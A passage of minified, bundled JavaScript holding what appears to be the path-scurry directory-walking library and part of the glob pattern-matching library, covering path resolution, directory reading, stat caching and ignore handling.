this.emit(w0);return this}this[w0]=!0,this[F9]=!0,this[k0].length=0,this[b0]=0;let J=this;if(typeof J.close==="function"&&!this[i4])J.close();if(X)this.emit("error",X);else this.emit(w0);return this}static get isStream(){return If1}}});import{posix as vf1,win32 as e3}from"node:path";import{fileURLToPath as ff1}from"node:url";import{lstatSync as xf1,readdir as hf1,readdirSync as yf1,readlinkSync as gf1,realpathSync as mf1}from"fs";import*as uf1 from"node:fs";import{lstat as lf1,readdir as pf1,readlink as df1,realpath as if1}from"node:fs/promises";var cf1,l7,WA=(X)=>!X||X===l7||X===uf1?l7:{...l7,...X,promises:{...l7.promises,...X.promises||{}}},GA,rf1=(X)=>X.replace(/\//g,"\\").replace(GA,"$1\\"),af1,b9=0,HA=1,zA=2,B6=4,$A=6,VA=8,X8=10,KA=12,k9=15,c7,o3=16,XA=32,p7=64,n9=128,s4=256,t4=512,JA,nf1=1023,t3=(X)=>X.isFile()?VA:X.isDirectory()?B6:X.isSymbolicLink()?X8:X.isCharacterDevice()?zA:X.isBlockDevice()?$A:X.isSocket()?KA:X.isFIFO()?HA:b9,QA,d7=(X)=>{let J=QA.get(X);if(J)return J;let Q=X.normalize("NFKD");return QA.set(X,Q),Q},YA,o4=(X)=>{let J=YA.get(X);if(J)return J;let Q=d7(X.toLowerCase());return YA.set(X,Q),Q},XG,UA,ZA,J9,e4,XQ,JG,i7,r7,JQ,Q10,qA;var BA=s(()=>{rR();s3();cf1=mf1.native,l7={lstatSync:xf1,readdir:hf1,readdirSync:yf1,readlinkSync:gf1,realpathSync:cf1,promises:{lstat:lf1,readdir:pf1,readlink:df1,realpath:if1}},GA=/^\\\\\?\\([a-z]:)\\?$/i,af1=/[\\\/]/,c7=~k9,JA=p7|n9|t4,QA=new Map,YA=new Map;XG=class XG extends h7{constructor(){super({max:256})}};UA=class UA extends h7{constructor(X=16384){super({maxSize:X,sizeCalculation:(J)=>J.length+1})}};ZA=Symbol("PathScurry setAsCwd");J9=class J9{name;root;roots;parent;nocase;isCWD=!1;#X;#J;get dev(){return this.#J}#G;get mode(){return this.#G}#Y;get nlink(){return this.#Y}#H;get uid(){return this.#H}#A;get gid(){return this.#A}#V;get rdev(){return this.#V}#U;get blksize(){return this.#U}#z;get ino(){return this.#z}#$;get size(){return this.#$}#W;get blocks(){return this.#W}#j;get atimeMs(){return this.#j}#O;get mtimeMs(){return this.#O}#q;get ctimeMs(){return this.#q}#Z;get birthtimeMs(){return this.#Z}#N;get atime(){return this.#N}#M;get mtime(){return this.#M}#L;get ctime(){return this.#L}#I;get birthtime(){return this.#I}#R;#D;#w;#B;#T;#C;#Q;#k;#F;#_;get parentPath(){return(this.parent||this).fullpath()}get path(){return this.parentPath}constructor(X,J=b9,Q,Y,W,G,H){if(this.name=X,this.#R=W?o4(X):d7(X),this.#Q=J&nf1,this.nocase=W,this.roots=Y,this.root=Q||this,this.#k=G,this.#w=H.fullpath,this.#T=H.relative,this.#C=H.relativePosix,this.parent=H.parent,this.parent)this.#X=this.parent.#X;else this.#X=WA(H.fs)}depth(){if(this.#D!==void 0)return this.#D;if(!this.parent)return this.#D=0;return this.#D=this.parent.depth()+1}childrenCache(){return this.#k}resolve(X){if(!X)return this;let J=this.getRootString(X),Y=X.substring(J.length).split(this.splitSep);return J?this.getRoot(J).#b(Y):this.#b(Y)}#b(X){let J=this;for(let Q of X)J=J.child(Q);return J}children(){let X=this.#k.get(this);if(X)return X;let J=Object.assign([],{provisional:0});return this.#k.set(this,J),this.#Q&=~o3,J}child(X,J){if(X===""||X===".")return this;if(X==="..")return this.parent||this;let Q=this.children(),Y=this.nocase?o4(X):d7(X);for(let z of Q)if(z.#R===Y)return z;let W=this.parent?this.sep:"",G=this.#w?this.#w+W+X:void 0,H=this.newChild(X,b9,{...J,parent:this,fullpath:G});if(!this.canReaddir())H.#Q|=n9;return Q.push(H),H}relative(){if(this.isCWD)return"";if(this.#T!==void 0)return this.#T;let X=this.name,J=this.parent;if(!J)return this.#T=this.name;let Q=J.relative();return Q+(!Q||!J.parent?"":this.sep)+X}relativePosix(){if(this.sep==="/")return this.relative();if(this.isCWD)return"";if(this.#C!==void 0)return this.#C;let X=this.name,J=this.parent;if(!J)return this.#C=this.fullpathPosix();let Q=J.relativePosix();return Q+(!Q||!J.parent?"":"/")+X}fullpath(){if(this.#w!==void 0)return this.#w;let X=this.name,J=this.parent;if(!J)return this.#w=this.name;let Y=J.fullpath()+(!J.parent?"":this.sep)+X;return this.#w=Y}fullpathPosix(){if(this.#B!==void 0)return this.#B;if(this.sep==="/")return this.#B=this.fullpath();if(!this.parent){let Y=this.fullpath().replace(/\\/g,"/");if(/^[a-z]:\//i.test(Y))return this.#B=`//?/${Y}`;else return this.#B=Y}let X=this.parent,J=X.fullpathPosix(),Q=J+(!J||!X.parent?"":"/")+this.name;return this.#B=Q}isUnknown(){return(this.#Q&k9)===b9}isType(X){return this[`is${X}`]()}getType(){return this.isUnknown()?"Unknown":this.isDirectory()?"Directory":this.isFile()?"File":this.isSymbolicLink()?"SymbolicLink":this.isFIFO()?"FIFO":this.isCharacterDevice()?"CharacterDevice":this.isBlockDevice()?"BlockDevice":this.isSocket()?"Socket":"Unknown"}isFile(){return(this.#Q&k9)===VA}isDirectory(){return(this.#Q&k9)===B6}isCharacterDevice(){return(this.#Q&k9)===zA}isBlockDevice(){return(this.#Q&k9)===$A}isFIFO(){return(this.#Q&k9)===HA}isSocket(){return(this.#Q&k9)===KA}isSymbolicLink(){return(this.#Q&X8)===X8}lstatCached(){return this.#Q&XA?this:void 0}readlinkCached(){return this.#F}realpathCached(){return this.#_}readdirCached(){let X=this.children();return X.slice(0,X.provisional)}canReadlink(){if(this.#F)return!0;if(!this.parent)return!1;let X=this.#Q&k9;return!(X!==b9&&X!==X8||this.#Q&s4||this.#Q&n9)}calledReaddir(){return!!(this.#Q&o3)}isENOENT(){return!!(this.#Q&n9)}isNamed(X){return!this.nocase?this.#R===d7(X):this.#R===o4(X)}async readlink(){let X=this.#F;if(X)return X;if(!this.canReadlink())return;if(!this.parent)return;try{let J=await this.#X.promises.readlink(this.fullpath()),Q=(await this.parent.realpath())?.resolve(J);if(Q)return this.#F=Q}catch(J){this.#K(J.code);return}}readlinkSync(){let X=this.#F;if(X)return X;if(!this.canReadlink())return;if(!this.parent)return;try{let J=this.#X.readlinkSync(this.fullpath()),Q=this.parent.realpathSync()?.resolve(J);if(Q)return this.#F=Q}catch(J){this.#K(J.code);return}}#v(X){this.#Q|=o3;for(let J=X.provisional;J<X.length;J++){let Q=X[J];if(Q)Q.#f()}}#f(){if(this.#Q&n9)return;this.#Q=(this.#Q|n9)&c7,this.#P()}#P(){let X=this.children();X.provisional=0;for(let J of X)J.#f()}#S(){this.#Q|=t4,this.#x()}#x(){if(this.#Q&p7)return;let X=this.#Q;if((X&k9)===B6)X&=c7;this.#Q=X|p7,this.#P()}#h(X=""){if(X==="ENOTDIR"||X==="EPERM")this.#x();else if(X==="ENOENT")this.#f();else this.children().provisional=0}#y(X=""){if(X==="ENOTDIR")this.parent.#x();else if(X==="ENOENT")this.#f()}#K(X=""){let J=this.#Q;if(J|=s4,X==="ENOENT")J|=n9;if(X==="EINVAL"||X==="UNKNOWN")J&=c7;if(this.#Q=J,X==="ENOTDIR"&&this.parent)this.parent.#x()}#g(X,J){return this.#E(X,J)||this.#m(X,J)}#m(X,J){let Q=t3(X),Y=this.newChild(X.name,Q,{parent:this}),W=Y.#Q&k9;if(W!==B6&&W!==X8&&W!==b9)Y.#Q|=p7;return J.unshift(Y),J.provisional++,Y}#E(X,J){for(let Q=J.provisional;Q<J.length;Q++){let Y=J[Q];if((this.nocase?o4(X.name):d7(X.name))!==Y.#R)continue;return this.#u(X,Y,Q,J)}}#u(X,J,Q,Y){let W=J.name;if(J.#Q=J.#Q&c7|t3(X),W!==X.name)J.name=X.name;if(Q!==Y.provisional){if(Q===Y.length-1)Y.pop();else Y.splice(Q,1);Y.unshift(J)}return Y.provisional++,J}async lstat(){if((this.#Q&n9)===0)try{return this.#d(await this.#X.promises.lstat(this.fullpath())),this}catch(X){this.#y(X.code)}}lstatSync(){if((this.#Q&n9)===0)try{return this.#d(this.#X.lstatSync(this.fullpath())),this}catch(X){this.#y(X.code)}}#d(X){let{atime:J,atimeMs:Q,birthtime:Y,birthtimeMs:W,blksize:G,blocks:H,ctime:z,ctimeMs:$,dev:V,gid:K,ino:Z,mode:q,mtime:B,mtimeMs:M,nlink:O,rdev:R,size:I,uid:F}=X;this.#N=J,this.#j=Q,this.#I=Y,this.#Z=W,this.#U=G,this.#W=H,this.#L=z,this.#q=$,this.#J=V,this.#A=K,this.#z=Z,this.#G=q,this.#M=B,this.#O=M,this.#Y=O,this.#V=R,this.#$=I,this.#H=F;let T=t3(X);if(this.#Q=this.#Q&c7|T|XA,T!==b9&&T!==B6&&T!==X8)this.#Q|=p7}#l=[];#p=!1;#i(X){this.#p=!1;let J=this.#l.slice();this.#l.length=0,J.forEach((Q)=>Q(null,X))}readdirCB(X,J=!1){if(!this.canReaddir()){if(J)X(null,[]);else queueMicrotask(()=>X(null,[]));return}let Q=this.children();if(this.calledReaddir()){let W=Q.slice(0,Q.provisional);if(J)X(null,W);else queueMicrotask(()=>X(null,W));return}if(this.#l.push(X),this.#p)return;this.#p=!0;let Y=this.fullpath();this.#X.readdir(Y,{withFileTypes:!0},(W,G)=>{if(W)this.#h(W.code),Q.provisional=0;else{for(let H of G)this.#g(H,Q);this.#v(Q)}this.#i(Q.slice(0,Q.provisional));return})}#c;async readdir(){if(!this.canReaddir())return[];let X=this.children();if(this.calledReaddir())return X.slice(0,X.provisional);let J=this.fullpath();if(this.#c)await this.#c;else{let Q=()=>{};this.#c=new Promise((Y)=>Q=Y);try{for(let Y of await this.#X.promises.readdir(J,{withFileTypes:!0}))this.#g(Y,X);this.#v(X)}catch(Y){this.#h(Y.code),X.provisional=0}this.#c=void 0,Q()}return X.slice(0,X.provisional)}readdirSync(){if(!this.canReaddir())return[];let X=this.children();if(this.calledReaddir())return X.slice(0,X.provisional);let J=this.fullpath();try{for(let Q of this.#X.readdirSync(J,{withFileTypes:!0}))this.#g(Q,X);this.#v(X)}catch(Q){this.#h(Q.code),X.provisional=0}return X.slice(0,X.provisional)}canReaddir(){if(this.#Q&JA)return!1;let X=k9&this.#Q;if(!(X===b9||X===B6||X===X8))return!1;return!0}shouldWalk(X,J){return(this.#Q&B6)===B6&&!(this.#Q&JA)&&!X.has(this)&&(!J||J(this))}async realpath(){if(this.#_)return this.#_;if((t4|s4|n9)&this.#Q)return;try{let X=await this.#X.promises.realpath(this.fullpath());return this.#_=this.resolve(X)}catch(X){this.#S()}}realpathSync(){if(this.#_)return this.#_;if((t4|s4|n9)&this.#Q)return;try{let X=this.#X.realpathSync(this.fullpath());return this.#_=this.resolve(X)}catch(X){this.#S()}}[ZA](X){if(X===this)return;X.isCWD=!1,this.isCWD=!0;let J=new Set([]),Q=[],Y=this;while(Y&&Y.parent)J.add(Y),Y.#T=Q.join(this.sep),Y.#C=Q.join("/"),Y=Y.parent,Q.push("..");Y=X;while(Y&&Y.parent&&!J.has(Y))Y.#T=void 0,Y.#C=void 0,Y=Y.parent}};e4=class e4 extends J9{sep="\\";splitSep=af1;constructor(X,J=b9,Q,Y,W,G,H){super(X,J,Q,Y,W,G,H)}newChild(X,J=b9,Q={}){return new e4(X,J,this.root,this.roots,this.nocase,this.childrenCache(),Q)}getRootString(X){return e3.parse(X).root}getRoot(X){if(X=rf1(X.toUpperCase()),X===this.root.name)return this.root;for(let[J,Q]of Object.entries(this.roots))if(this.sameRoot(X,J))return this.roots[X]=Q;return this.roots[X]=new i7(X,this).root}sameRoot(X,J=this.root.name){return X=X.toUpperCase().replace(/\//g,"\\").replace(GA,"$1\\"),X===J}};XQ=class XQ extends J9{splitSep="/";sep="/";constructor(X,J=b9,Q,Y,W,G,H){super(X,J,Q,Y,W,G,H)}getRootString(X){return X.startsWith("/")?"/":""}getRoot(X){return this.root}newChild(X,J=b9,Q={}){return new XQ(X,J,this.root,this.roots,this.nocase,this.childrenCache(),Q)}};JG=class JG{root;rootPath;roots;cwd;#X;#J;#G;nocase;#Y;constructor(X=process.cwd(),J,Q,{nocase:Y,childrenCacheSize:W=16384,fs:G=l7}={}){if(this.#Y=WA(G),X instanceof URL||X.startsWith("file://"))X=ff1(X);let H=J.resolve(X);this.roots=Object.create(null),this.rootPath=this.parseRootPath(H),this.#X=new XG,this.#J=new XG,this.#G=new UA(W);let z=H.substring(this.rootPath.length).split(Q);if(z.length===1&&!z[0])z.pop();if(Y===void 0)throw TypeError("must provide nocase setting to PathScurryBase ctor");this.nocase=Y,this.root=this.newRoot(this.#Y),this.roots[this.rootPath]=this.root;let $=this.root,V=z.length-1,K=J.sep,Z=this.rootPath,q=!1;for(let B of z){let M=V--;$=$.child(B,{relative:Array(M).fill("..").join(K),relativePosix:Array(M).fill("..").join("/"),fullpath:Z+=(q?"":K)+B}),q=!0}this.cwd=$}depth(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.depth()}childrenCache(){return this.#G}resolve(...X){let J="";for(let W=X.length-1;W>=0;W--){let G=X[W];if(!G||G===".")continue;if(J=J?`${G}/${J}`:G,this.isAbsolute(G))break}let Q=this.#X.get(J);if(Q!==void 0)return Q;let Y=this.cwd.resolve(J).fullpath();return this.#X.set(J,Y),Y}resolvePosix(...X){let J="";for(let W=X.length-1;W>=0;W--){let G=X[W];if(!G||G===".")continue;if(J=J?`${G}/${J}`:G,this.isAbsolute(G))break}let Q=this.#J.get(J);if(Q!==void 0)return Q;let Y=this.cwd.resolve(J).fullpathPosix();return this.#J.set(J,Y),Y}relative(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.relative()}relativePosix(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.relativePosix()}basename(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.name}dirname(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return(X.parent||X).fullpath()}async readdir(X=this.cwd,J={withFileTypes:!0}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X,X=this.cwd;let{withFileTypes:Q}=J;if(!X.canReaddir())return[];else{let Y=await X.readdir();return Q?Y:Y.map((W)=>W.name)}}readdirSync(X=this.cwd,J={withFileTypes:!0}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X,X=this.cwd;let{withFileTypes:Q=!0}=J;if(!X.canReaddir())return[];else if(Q)return X.readdirSync();else return X.readdirSync().map((Y)=>Y.name)}async lstat(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.lstat()}lstatSync(X=this.cwd){if(typeof X==="string")X=this.cwd.resolve(X);return X.lstatSync()}async readlink(X=this.cwd,{withFileTypes:J}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X.withFileTypes,X=this.cwd;let Q=await X.readlink();return J?Q:Q?.fullpath()}readlinkSync(X=this.cwd,{withFileTypes:J}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X.withFileTypes,X=this.cwd;let Q=X.readlinkSync();return J?Q:Q?.fullpath()}async realpath(X=this.cwd,{withFileTypes:J}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X.withFileTypes,X=this.cwd;let Q=await X.realpath();return J?Q:Q?.fullpath()}realpathSync(X=this.cwd,{withFileTypes:J}={withFileTypes:!1}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X.withFileTypes,X=this.cwd;let Q=X.realpathSync();return J?Q:Q?.fullpath()}async walk(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:G}=J,H=[];if(!W||W(X))H.push(Q?X:X.fullpath());let z=new Set,$=(K,Z)=>{z.add(K),K.readdirCB((q,B)=>{if(q)return Z(q);let M=B.length;if(!M)return Z();let O=()=>{if(--M===0)Z()};for(let R of B){if(!W||W(R))H.push(Q?R:R.fullpath());if(Y&&R.isSymbolicLink())R.realpath().then((I)=>I?.isUnknown()?I.lstat():I).then((I)=>I?.shouldWalk(z,G)?$(I,O):O());else if(R.shouldWalk(z,G))$(R,O);else O()}},!0)},V=X;return new Promise((K,Z)=>{$(V,(q)=>{if(q)return Z(q);K(H)})})}walkSync(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:G}=J,H=[];if(!W||W(X))H.push(Q?X:X.fullpath());let z=new Set([X]);for(let $ of z){let V=$.readdirSync();for(let K of V){if(!W||W(K))H.push(Q?K:K.fullpath());let Z=K;if(K.isSymbolicLink()){if(!(Y&&(Z=K.realpathSync())))continue;if(Z.isUnknown())Z.lstatSync()}if(Z.shouldWalk(z,G))z.add(Z)}}return H}[Symbol.asyncIterator](){return this.iterate()}iterate(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X,X=this.cwd;return this.stream(X,J)[Symbol.asyncIterator]()}[Symbol.iterator](){return this.iterateSync()}*iterateSync(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:G}=J;if(!W||W(X))yield Q?X:X.fullpath();let H=new Set([X]);for(let z of H){let $=z.readdirSync();for(let V of $){if(!W||W(V))yield Q?V:V.fullpath();let K=V;if(V.isSymbolicLink()){if(!(Y&&(K=V.realpathSync())))continue;if(K.isUnknown())K.lstatSync()}if(K.shouldWalk(H,G))H.add(K)}}}stream(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:G}=J,H=new eX({objectMode:!0});if(!W||W(X))H.write(Q?X:X.fullpath());let z=new Set,$=[X],V=0,K=()=>{let Z=!1;while(!Z){let q=$.shift();if(!q){if(V===0)H.end();return}V++,z.add(q);let B=(O,R,I=!1)=>{if(O)return H.emit("error",O);if(Y&&!I){let F=[];for(let T of R)if(T.isSymbolicLink())F.push(T.realpath().then((b)=>b?.isUnknown()?b.lstat():b));if(F.length){Promise.all(F).then(()=>B(null,R,!0));return}}for(let F of R)if(F&&(!W||W(F))){if(!H.write(Q?F:F.fullpath()))Z=!0}V--;for(let F of R){let T=F.realpathCached()||F;if(T.shouldWalk(z,G))$.push(T)}if(Z&&!H.flowing)H.once("drain",K);else if(!M)K()},M=!0;q.readdirCB(B,!0),M=!1}};return K(),H}streamSync(X=this.cwd,J={}){if(typeof X==="string")X=this.cwd.resolve(X);else if(!(X instanceof J9))J=X,X=this.cwd;let{withFileTypes:Q=!0,follow:Y=!1,filter:W,walkFilter:G}=J,H=new eX({objectMode:!0}),z=new Set;if(!W||W(X))H.write(Q?X:X.fullpath());let $=[X],V=0,K=()=>{let Z=!1;while(!Z){let q=$.shift();if(!q){if(V===0)H.end();return}V++,z.add(q);let B=q.readdirSync();for(let M of B)if(!W||W(M)){if(!H.write(Q?M:M.fullpath()))Z=!0}V--;for(let M of B){let O=M;if(M.isSymbolicLink()){if(!(Y&&(O=M.realpathSync())))continue;if(O.isUnknown())O.lstatSync()}if(O.shouldWalk(z,G))$.push(O)}}if(Z&&!H.flowing)H.once("drain",K)};return K(),H}chdir(X=this.cwd){let J=this.cwd;this.cwd=typeof X==="string"?this.cwd.resolve(X):X,this.cwd[ZA](J)}};i7=class i7 extends JG{sep="\\";constructor(X=process.cwd(),J={}){let{nocase:Q=!0}=J;super(X,e3,"\\",{...J,nocase:Q});this.nocase=Q;for(let Y=this.cwd;Y;Y=Y.parent)Y.nocase=this.nocase}parseRootPath(X){return e3.parse(X).root.toUpperCase()}newRoot(X){return new e4(this.rootPath,B6,void 0,this.roots,this.nocase,this.childrenCache(),{fs:X})}isAbsolute(X){return X.startsWith("/")||X.startsWith("\\")||/^[a-z]:(\/|\\)/i.test(X)}};r7=class r7 extends JG{sep="/";constructor(X=process.cwd(),J={}){let{nocase:Q=!1}=J;super(X,vf1,"/",{...J,nocase:Q});this.nocase=Q}parseRootPath(X){return"/"}newRoot(X){return new XQ(this.rootPath,B6,void 0,this.roots,this.nocase,this.childrenCache(),{fs:X})}isAbsolute(X){return X.startsWith("/")}};JQ=class JQ extends r7{constructor(X=process.cwd(),J={}){let{nocase:Q=!0}=J;super(X,{...J,nocase:Q})}};Q10=process.platform==="win32"?e4:XQ,qA=process.platform==="win32"?i7:process.platform==="darwin"?JQ:r7});class UJ{#X;#J;#G;length;#Y;#H;#A;#V;#U;#z;#$=!0;constructor(X,J,Q,Y){if(!sf1(X))throw TypeError("empty pattern list");if(!of1(J))throw TypeError("empty glob list");if(J.length!==X.length)throw TypeError("mismatched pattern list and glob list lengths");if(this.length=X.length,Q<0||Q>=this.length)throw TypeError("index out of range");if(this.#X=X,this.#J=J,this.#G=Q,this.#Y=Y,this.#G===0){if(this.isUNC()){let[W,G,H,z,...$]=this.#X,[V,K,Z,q,...B]=this.#J;if($[0]==="")$.shift(),B.shift();let M=[W,G,H,z,""].join("/"),O=[V,K,Z,q,""].join("/");this.#X=[M,...$],this.#J=[O,...B],this.length=this.#X.length}else if(this.isDrive()||this.isAbsolute()){let[W,...G]=this.#X,[H,...z]=this.#J;if(G[0]==="")G.shift(),z.shift();let $=W+"/",V=H+"/";this.#X=[$,...G],this.#J=[V,...z],this.length=this.#X.length}}}pattern(){return this.#X[this.#G]}isString(){return typeof this.#X[this.#G]==="string"}isGlobstar(){return this.#X[this.#G]===y0}isRegExp(){return this.#X[this.#G]instanceof RegExp}globString(){return this.#A=this.#A||(this.#G===0?this.isAbsolute()?this.#J[0]+this.#J.slice(1).join("/"):this.#J.join("/"):this.#J.slice(this.#G).join("/"))}hasMore(){return this.length>this.#G+1}rest(){if(this.#H!==void 0)return this.#H;if(!this.hasMore())return this.#H=null;return this.#H=new UJ(this.#X,this.#J,this.#G+1,this.#Y),this.#H.#z=this.#z,this.#H.#U=this.#U,this.#H.#V=this.#V,this.#H}isUNC(){let X=this.#X;return this.#U!==void 0?this.#U:this.#U=this.#Y==="win32"&&this.#G===0&&X[0]===""&&X[1]===""&&typeof X[2]==="string"&&!!X[2]&&typeof X[3]==="string"&&!!X[3]}isDrive(){let X=this.#X;return this.#V!==void 0?this.#V:this.#V=this.#Y==="win32"&&this.#G===0&&this.length>1&&typeof X[0]==="string"&&/^[a-z]:$/i.test(X[0])}isAbsolute(){let X=this.#X;return this.#z!==void 0?this.#z:this.#z=X[0]===""&&X.length>1||this.isDrive()||this.isUNC()}root(){let X=this.#X[0];return typeof X==="string"&&this.isAbsolute()&&this.#G===0?X:""}checkFollowGlobstar(){return!(this.#G===0||!this.isGlobstar()||!this.#$)}markFollowGlobstar(){if(this.#G===0||!this.isGlobstar()||!this.#$)return!1;return this.#$=!1,!0}}var sf1=(X)=>X.length>=1,of1=(X)=>X.length>=1;var QG=s(()=>{BX()});class a7{relative;relativeChildren;absolute;absoluteChildren;platform;mmopts;constructor(X,{nobrace:J,nocase:Q,noext:Y,noglobstar:W,platform:G=tf1}){this.relative=[],this.absolute=[],this.relativeChildren=[],this.absoluteChildren=[],this.platform=G,this.mmopts={dot:!0,nobrace:J,nocase:Q,noext:Y,noglobstar:W,optimizationLevel:2,platform:G,nocomment:!0,nonegate:!0};for(let H of X)this.add(H)}add(X){let J=new E9(X,this.mmopts);for(let Q=0;Q<J.set.length;Q++){let Y=J.set[Q],W=J.globParts[Q];if(!Y||!W)throw Error("invalid pattern object");while(Y[0]==="."&&W[0]===".")Y.shift(),W.shift();let G=new UJ(Y,W,0,this.platform),H=new E9(G.globString(),this.mmopts),z=W[W.length-1]==="**",$=G.isAbsolute();if($)this.absolute.push(H);else this.relative.push(H);if(z)if($)this.absoluteChildren.push(H);else this.relativeChildren.push(H)}}ignored(X){let J=X.fullpath(),Q=`${J}/`,Y=X.relative()||".",W=`${Y}/`;for(let G of this.relative)if(G.match(Y)||G.match(W))return!0;for(let G of this.absolute)if(G.match(J)||G.match(Q))return!0;return!1}childrenIgnored(X){let J=X.fullpath()+"/",Q=(X.relative()||".")+"/";for(let Y of this.relativeChildren)if(Y.match(Q))return!0;for(let Y of this.absoluteChildren)if(Y.match(J))return!0;return!1}}var tf1;var YG=s(()=>{BX();QG();tf1=typeof process==="object"&&process&&typeof process.platform==="string"?process.platform:"linux"});class WG{store;constructor(X=new Map){this.store=X}copy(){return new WG(new Map(this.store))}hasWalked(X,J){return this.store.get(X.fullpath())?.has(J.globString())}storeWalked(X,J){let Q=X.fullpath(),Y=this.store.get(Q);if(Y)Y.add(J.globString());else this.store.set(Q,new Set([J.globString()]))}}class MA{store=new Map;add(X,J,Q){let Y=(J?2:0)|(Q?1:0),W=this.store.get(X);this.store.set(X,W===void 0?Y:Y&W)}entries(){return[...this.store.entries()].map(([X,J])=>[X,!!(J&2),!!(J&1)])}}class jA{store=new Map;add(X,J){if(!X.canReaddir())return;let Q=this.store.get(X);if(Q){if(!Q.find((Y)=>Y.globString()===J.globString()))Q.push(J)}else this.store.set(X,[J])}get(X){let J=this.store.get(X);if(!J)throw Error("attempting to walk unknown path");return J}entries(){return this.keys().map((X)=>[X,this.store.get(X)])}keys(){return[...this.store.keys()].filter((X)=>X.canReaddir())}}class n7{hasWalkedCache;matches=new MA;subwalks=new jA;patterns;follow;dot;opts;constructor(X,J){this.opts=X,this.follow=!!X.follow,this.dot=!!X.dot,this.hasWalkedCache=J?J.copy():new WG}processPatterns(X,J){this.patterns=J;let Q=J.map((Y)=>[X,Y]);for(let[Y,W]of Q){this.hasWalkedCache.storeWalked(Y,W);let G=W.root(),H=W.isAbsolute()&&this.opts.absolute!==!1;if(G){Y=Y.resolve(G==="/"&&this.opts.root!==void 0?this.opts.root:G);let K=W.rest();if(!K){this.matches.add(Y,!0,!1);continue}else W=K}if(Y.isENOENT())continue;let z,$,V=!1;while(typeof(z=W.pattern())==="string"&&($=W.rest()))Y=Y.resolve(z),W=$,V=!0;if(z=W.pattern(),$=W.rest(),V){if(this.hasWalkedCache.hasWalked(Y,W))continue;this.hasWalkedCache.storeWalked(Y,W)}if(typeof z==="string"){let K=z===".."||z===""||z===".";this.matches.add(Y.resolve(z),H,K);continue}else if(z===y0){if(!Y.isSymbolicLink()||this.follow||W.checkFollowGlobstar())this.subwalks.add(Y,W);let K=$?.pattern(),Z=$?.rest();if(!$||(K===""||K===".")&&!Z)this.matches.add(Y,H,K===""||K===".");else if(K===".."){let q=Y.parent||Y;if(!Z)this.matches.add(q,H,!0);else if(!this.hasWalkedCache.hasWalked(q,Z))this.subwalks.add(q,Z)}}else if(z instanceof RegExp)this.subwalks.add(Y,W)}return this}subwalkTargets(){return this.subwalks.keys()}child(){return new n7(this.opts,this.hasWalkedCache)}filterEntries(X,J){let Q=this.subwalks.get(X),Y=this.child();for(let W of J)for(let G of Q){let H=G.isAbsolute(),z=G.pattern(),$=G.rest();if(z===y0)Y.testGlobstar(W,G,$,H);else if(z instanceof RegExp)Y.testRegExp(W,z,$,H);else Y.testString(W,z,$,H)}return Y}testGlobstar(X,J,Q,Y){if(this.dot||!X.name.startsWith(".")){if(!J.hasMore())this.matches.add(X,Y,!1);if(X.canReaddir()){if(this.follow||!X.isSymbolicLink())this.subwalks.add(X,J);else if(X.isSymbolicLink()){if(Q&&J.checkFollowGlobstar())this.subwalks.add(X,Q);else if(J.markFollowGlobstar())this.subwalks.add(X,J)}}}if(Q){let W=Q.pattern();if(typeof W==="string"&&W!==".."&&W!==""&&W!==".")this.testString(X,W,Q.rest(),Y);else if(W===".."){let G=X.parent||X;this.subwalks.add(G,Q)}else if(W instanceof RegExp)this.testRegExp(X,W,Q.rest(),Y)}}testRegExp(X,J,Q,Y){if(!J.test(X.name))return;if(!Q)this.matches.add(X,Y,!1);else this.subwalks.add(X,Q)}testString(X,J,Q,Y){if(!X.isNamed(J))return;if(!Q)this.matches.add(X,Y,!1);else this.subwalks.add(X,Q)}}var OA=s(()=>{BX()});class GG{path;patterns;opts;seen=new Set;paused=!1;aborted=!1;#X=[];#J;#G;signal;maxDepth;includeChildMatches;constructor(X,J,Q){if(this.patterns=X,this.path=J,this.opts=Q,this.#G=!Q.posix&&Q.platform==="win32"?"\\":"/",this.includeChildMatches=Q.includeChildMatches!==!1,Q.ignore||!this.includeChildMatches){if(this.#J=ef1(Q.ignore??[],Q),!this.includeChildMatches&&typeof this.#J.add!=="function")throw Error("cannot ignore child matches, ignore lacks add() method.")}if(this.maxDepth=Q.maxDepth||1/0,Q.signal)this.signal=Q.signal,this.signal.addEventListener("abort",()=>{this.#X.length=0})}#Y(X){return this.seen.has(X)||!!this.#J?.ignored?.(X)}#H(X){return!!this.#J?.childrenIgnored?.(X)}pause(){this.paused=!0}resume(){if(this.signal?.aborted)return;this.paused=!1;let X=void 0;while(!this.paused&&(X=this.#X.shift()))X()}onResume(X){if(this.signal?.aborted)return;if(!this.paused)X();else this.#X.push(X)}async matchCheck(X,J){if(J&&this.opts.nodir)return;let Q;if(this.opts.realpath){if(Q=X.realpathCached()||await X.realpath(),!Q)return;X=Q}let W=X.isUnknown()||this.opts.stat?await X.lstat():X;if(this.opts.follow&&this.opts.nodir&&W?.isSymbolicLink()){let G=await W.realpath();if(G&&(G.isUnknown()||this.opts.stat))await G.lstat()}return 